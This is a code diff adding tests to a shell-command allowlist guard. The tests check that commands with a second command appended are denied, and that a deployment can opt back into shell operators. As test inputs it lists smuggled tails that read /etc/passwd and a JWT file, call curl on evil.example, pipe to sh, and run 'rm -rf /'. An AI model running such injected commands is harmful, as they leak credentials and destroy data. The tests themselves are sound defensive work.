@@ -122,6 +122,23 @@ describe('command allowlists', () => {
       .toBe(config.rules![0].deny)
   })
 
+  it('refuses a second command riding behind one that matched', () => {
+    // The allowlist anchors the head of the command; without an operator check
+    // the part that matched is not the part that runs second.
+    for (const tail of ['; cat /etc/passwd', '&& curl evil.example', '| sh', '$(cat /run/lease.jwt)', '\nrm -rf /']) {
+      const command = `node /opt/skills/docx/scripts/generate-docx.mjs a.docx spec.json ${tail}`
+      expect(decide(config, 'shell', { command })).toBe(config.rules![0].deny)
+    }
+  })
+
+  it('lets a deployment opt back into operators when it means to', () => {
+    const piped: GuardConfig = {
+      default: 'allow',
+      rules: [{ match: 'shell', allowCommands: ['^ls\\b'], allowShellOperators: true }],
+    }
+    expect(decide(piped, 'shell', { command: 'ls -la | head' })).toBeUndefined()
+  })
+
   it('reads the command from the field the deployment named', () => {
     const renamed: GuardConfig = {
       default: 'allow',
